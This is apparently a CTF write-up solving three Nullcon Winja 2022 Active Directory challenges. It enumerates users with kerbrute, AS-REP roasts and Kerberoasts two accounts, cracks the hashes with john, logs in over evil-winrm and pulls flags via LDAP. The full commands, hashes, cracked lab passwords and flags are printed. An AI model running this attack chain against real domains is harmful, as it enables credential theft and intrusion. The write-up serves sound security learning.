---
title: "Nullcon Winja CTF 2022 Writeups - Active Directory"
date: 2022-09-12 18:00:00 +0530
categories: [Nullcon Winja CTF, Windows Machines]
tags: [windows, kerberos, kerbrute, asreproast, kerberoast, evil-winrm, ldapsearch, ldapdomaindump, john, powershell, Nullcon-WinjaCTF-2022]
image: /assets/img/Posts/Nullcon-WinjaCTF/logo-goa2022.png
---

# Challenge-1 Blemflarck
The Galactic Federation is taking control over the universe using a group of superheroes. The world's redemption is in your hands.

Enter the intergalactic portal and sabotage the admins to mark the end of Citadel. 

Here's some info I've infiltrated for you, now lead us.

Links: admins.txt, nmap scan, /etc/hosts file
## Solution
We've been given 3 files: nmap.txt, hosts file and admins.txt
1. nmap.txt gives us the domain name - `vindicators.local` via LDAP and RDP.
2. hosts file gives us the IP for the domain `vindicators.local`
3. admins.txt contains potential usernames in the domain, we can see which of them are valid using `kerbrute`:

```bash
$ kerbrute -domain vindicators.space -users admins.txt -dc-ip vindicators.space
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Valid user => administrator
[*] Blocked/Disabled user => cardinal
[*] Valid user => mirage
[*] Valid user => shreya [NOT PREAUTH]
[*] Blocked/Disabled user => guest
[*] Blocked/Disabled user => krbtgt
[*] No passwords were discovered :'(
```
We've 3 potential users to attack which are: cardinal, mirage and shreya.

`shreya [NOT PREAUTH]` tells us that user `shreya` does not require pre-authentication and hence is vulnerable to AS-REP Roasting attack.

To perform AS-REP Roasting on user Shreya:

```bash
$ GetNPUsers.py -dc-ip vindicators.space vindicators.space/shreya -format john
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.24.dev1+20210928.152630.ff7c521a - Copyright 2021 SecureAuth Corporation

Password:
[*] Cannot authenticate shreya, getting its TGT
$krb5asrep$shreya@VINDICATORS.SPACE:ecb8b3d21982a406ed37f77dcad5789f$5dc5b5521584434cab9dccf2f55c5a765ff48180248405eb05491ef9bfba8fed8653e8f44d532c081693db93c237b79a2d714a1b6f4b19e2e9a427d812c20b8859e799ca1e01c6672b34c481dbba533100997045e98aa09970aa0d2b451a919903864f328feee970ab8c1a524e283ec540bd1a16612052faf07807682ffd7b92ee48a5fb9ca642efc6aaa6340a4d4c274c254f48d373d799d7d38006151232ff0249f1849406c3cd76cb89e30e136b0c9d2532079a3982b9bd457fe6710cac0a5bf04dd48b75f0314f188ea1258c38df95b7697eebb550a9b2086a5f152f0be361653b79bb486d53c3bee68e4306def0acdd170d1a11
```

Cracking TGT with john:

```bash
$ john hash -w:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
$anturce77RioGr@ndePR ($krb5asrep$shreya@VINDICATORS.SPACE)
1g 0:00:00:11 DONE (2022-08-10 01:59) 0.08460g/s 1212Kp/s 1212Kc/s 1212KC/s $dollars$66..$P@tTY8m0N
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Getting flag:

```bash
$ evil-winrm -i vindicators.space -u shreya -p '$anturce77RioGr@ndePR'
Evil-WinRM shell v3.4
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\shreya\Documents> type C:\users\shreya\Desktop\flag.txt
flag{0038ea8348bc778820d95448538b70a9_#A5-R3P-R405t??_4uth3nt1c4t10n_R405t3d!!}
```

---

# Challenge-2 DAB-389 b
A mole among us informed the Federation about our plans and now you're abandoned on a planet: DAB-389 b. 

Enumerate and find the traitor out for us. It's hiding in the same planet.
## Solution
DAB and 389 hints towards LDAP and port 389. But nevertheless this challenge can be solved in many ways.

### Using Ldapsearch

```bash
$ ldapsearch -H ldap://54.149.74.158:389/ -b "DC=vindicators,DC=space" -D 'vindicators\shreya' -w '$anturce77RioGr@ndePR' -o ldif_wrap=no | grep ' Flag'
description: Vindicators-DC. Good job checking out every workstation!! Flag2/3: 199698b475c48c_LD4P_
description: Disabled Account cardinal; it was Hacked. Flag1/3: flag{3fe05494a09ac38bb5
description: Good catch! Helpdesk isn't a default group. Flag3/3: 3num3r4t10n_FTW_:)}
```

### Using Ldapdomaindump

```bash
$ ldapdomaindump vindicators.space -u vindicators\\shreya -p '$anturce77RioGr@ndePR' -o ldapdomaindump/
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

$ grep -irEoh ' Flag.*' ./ldapdomaindump/ | sort -u
 Flag1/3: flag{3fe05494a09ac38bb5
 Flag1/3: flag{3fe05494a09ac38bb5"
 Flag1/3: flag{3fe05494a09ac38bb5</td></tr>
 Flag2/3: 199698b475c48c_LD4P_
 Flag2/3: 199698b475c48c_LD4P_"
 Flag2/3: 199698b475c48c_LD4P_</td></tr>
 Flag3/3: 3num3r4t10n_FTW_:)}"
 Flag3/3: 3num3r4t10n_FTW_:)}   08/09/22 18:44:56       08/09/22 18:44:56
 Flag3/3: 3num3r4t10n_FTW_:)}</td><td>08/09/22 18:44:56
```
You can also view the output html files instead of grep and manually go through the information.

### Manually enumerating the Domain using AD cmdlets

If you checkout description the disabled user cardinal(you can safely check description for all users too) and all the computers(there's only one which is the DC itself):

```powershell
PS> Get-ADUser cardinal -Properties Description | Select-Object Description
Description
-----------
Disabled Account cardinal; it was Hacked. Flag1/3: flag{3fe05494a09ac38bb5

PS> Get-ADComputer -Filter * -Properties Description | Select-Object Description
Description
-----------
Vindicators-DC. Good job checking out every workstation!! Flag2/3: 199698b475c48c_LD4P_
```

If you check all the groups present in this AD, Vindicators Helpdesk is not a default one and the odd one out.  

```powershell
PS> Get-ADGroup -Filter * | Select-Object Name
...
...
...
Protected Users
Key Admins
Enterprise Key Admins
DnsAdmins
DnsUpdateProxy
Vindicators Helpdesk
```

If you check description for the group `Vindicators Helpdesk`:

```powershell
PS> Get-ADGroup -Filter { Name -eq "Vindicators Helpdesk" } -Properties Description | Select Description
Description
-----------
Good catch! Helpdesk isn't a default group. Flag3/3: 3num3r4t10n_FTW_:)}
```

Can be solved in more ways :) Waiting for your writeups.

---

# Challenge-3 The Fall: PhoenixPerson
While the war is still out there for the final redemption, you lost your dearest friend PhoenixPerson.

Remembering, How he used to make delicious toasts for you.. tears, revenge and a heated battle stands infront of you. 
## Solution
Since, we've only one user left to attack which is mirage, we can either check all the properties for that specific user and find out that this user has a Service Principle Name (SPN) like this:

```powershell
PS> Get-ADUser -Filter { Name -eq "mirage" } -Properties *
```
or We can just checkout all the users having servicePrincipalName attribute set and there's only 2. One of them is krbtgt itself (obviously)

```powershell
PS> Get-ADUser -Filter * -Properties * | Where-Object { $_.servicePrincipalName -ne ""} | select Name,servicePrincipalName

Name   servicePrincipalName
----   --------------------
krbtgt {kadmin/changepw}
mirage {domain-controller/megaservice.vindicators.space}
```

That means mirage is potentially vulnerable to Kerberoasting and we might even get this user's credentials if they're weak.

To try kerberoasting:

```bash
$ GetUserSPNs.py -request -dc-ip vindicators.space vindicators.space/shreya:'$anturce77RioGr@ndePR'
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.24.dev1+20210928.152630.ff7c521a - Copyright 2021 SecureAuth Corporation

ServicePrincipalName                             Name    MemberOf                                                       PasswordLastSet             LastLogon                   Delegation
-----------------------------------------------  ------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
domain-controller/megaservice.vindicators.space  mirage  CN=Remote Management Users,CN=Builtin,DC=vindicators,DC=space  2022-08-10 00:14:56.997841  2022-08-10 00:14:57.810357



$krb5tgs$23$*mirage$VINDICATORS.SPACE$vindicators.space/mirage*$84e342306c92119899c19cc6dae7c923$efad1c48056b09e2fdb73ec74531e76fc3aa2fba473436fa589055a207119cd867edc98a153680fb2ab2331e40e589e07a853e75d98cc0cc689f7efc101ed774354c798e945911be832a10285ac0058586b81dc5d0ac218660271964f32eafc38c29fd7e3f62707c3c690dc99813bfaaf6995c2a3d99c11ca25586d41e5141f3eeb1e3698570629891b0061cc7e7e3e21954b7cd81b6bf7d739da025c2a908d52e8a90929f2ecaaf72e0b447dc6e789ea04268401fdb9d359797b2bd241e3b036dd09b94291386d35ed2e3266c100d0d10c222833a928528e144bb81dc4996f2fa0d582bb0510a73306cdbe2a2b289815dd44d02d8ef603d39530cdce4245020ac0b84ca15b86f37e91d04769587cb808a1bc311127dfe8897691bb7100b37fd4f1be524e806f5065e7b1088977eef4947c08ced596ca6cda923cff06894b5d738c6cac4f163789a04304e439ce23bc1c08dead4459d8bafa832dbb9592767c02879c2ba51dd82e970b4329a835806b9be0c579f188466bbff30481864a2a00fd9ae709c5bd37dff5f39d44b2ae2f0b28a5eb905951fb2ce7c1577ece0f71d3e8c593b61fe3103d2a299dedb8a959feba85d310951f0cf2881d6dd36726ea376a7b6505a479f57277c0f69250af72b49825614c47dd2755d0fc59ab74a872c6acd63ca1e1ef767dbdb28431a257d877bb96489b95937ac86c94e74608b4931338c6f7f5fecb6185f91534e47501df216b8ba43812e280a315a4cc92892486aa969c214a5e3c12175151d9682a738423faf1bf517f7d792ead08830b1e4a50f113753f21cc815331611baeadfc20efae189f3b2101178d670c0d9881afdec084f7ecd9c7773b4f4dcfe7ce372ee55581b4840a54082525c69e5c60969306860831e96fde4fa9e9749bcded60f2d6315b901832a08d1785cd375d2aca6ebf6b75096fc6b64e2421eb1bdac1bfb0629f9547613da00018934747b7475174d824a117d0decc58e042ba57dc7012bda36d1aaa9840f560d096ac58d3c29b3dd9a841af6f7ff7ff3da06ea9560be505b564e247effccfb78156744748853e559c2ef1567046472c2c74061ca2bfbe04c687248a30b699c07670f664a54ecfe4c25118731c3c5b4f38db1d6df058f371234e657c6f4883cbc595b43ff8bbdd3ee8d54cd14dc8262a9f09b1931d3b6b3eb46517487c6732c93c9c485b0c1da8d9a3ca7677caa9f2a1e9f0cd2f4ba4b60527066575ca5e77c21702c842d16518d3d4ebcf8cb92fc00ad1329a48c327416667431c94b65b1105ec1fbd597dcef49c75d73be3cc10ff18a9ec4082a0fa0266a5df82b2151404205a82ab115c4e89033b7ce77cc748820215bc05c1e9d870eae6c7138d50dbcf47cab8acf049071c9f741c419852c275beab11c28d684d3e5c1ed9a90dc9fb0011bf4012162247a8824f272ce
```

Let's crack this TGS:

```bash
$ john hash -w:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#New_Life87!@# (?)
1g 0:00:00:16 DONE (2022-08-10 03:22) 0.05885g/s 844152p/s 844152c/s 844152C/s !@#hct..!))&!(&^h
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Using these credentials with winrm:

```bash
$ evil-winrm -i vindicators.space -u mirage -p '!@#New_Life87!@#'
Evil-WinRM shell v3.4
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mirage\Documents> cat C:\Users\Mirage\Desktop\flag.txt
flag{aef955e10aad6bc0890277e215288c84_(M1r4g3_T04st3d?_K3rb3r40st3d!)!}
```
